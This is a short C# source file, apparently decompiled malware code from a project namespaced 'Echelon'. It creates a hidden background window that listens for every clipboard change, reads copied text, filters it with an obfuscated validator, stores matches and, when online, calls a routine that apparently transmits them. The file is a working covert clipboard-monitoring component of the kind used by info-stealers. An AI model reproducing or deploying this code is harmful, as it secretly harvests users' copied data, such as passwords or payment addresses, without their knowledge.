using Echelon;
using Echelon.Properties;
using System;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

internal class d : Form
{
	internal d()
	{
		SuspendLayout();
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		base.ClientSize = new Size(383, 191);
		base.Name = "BackgroundForm";
		Text = "BackgroundForm";
		base.Load += b;
		ResumeLayout(performLayout: false);
		a(base.Handle);
	}

	[DllImport("user32.dll", EntryPoint = "AddClipboardFormatListener", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool a(IntPtr r);

	protected override void WndProc(ref Message m)
	{
		base.WndProc(ref m);
		if (m.Msg != 797 || !Clipboard.ContainsText())
		{
			return;
		}
		string text = Clipboard.GetText();
		if (!Resources.e.Split(new string[1]
		{
			Environment.NewLine
		}, StringSplitOptions.RemoveEmptyEntries).ToList().Contains(text) && e.a(text))
		{
			e.b(text);
			if (Internet.CheckConnection())
			{
				f.a();
			}
			else
			{
				Thread.Sleep(2000);
			}
		}
	}

	private void b(object s, EventArgs t)
	{
	}
}
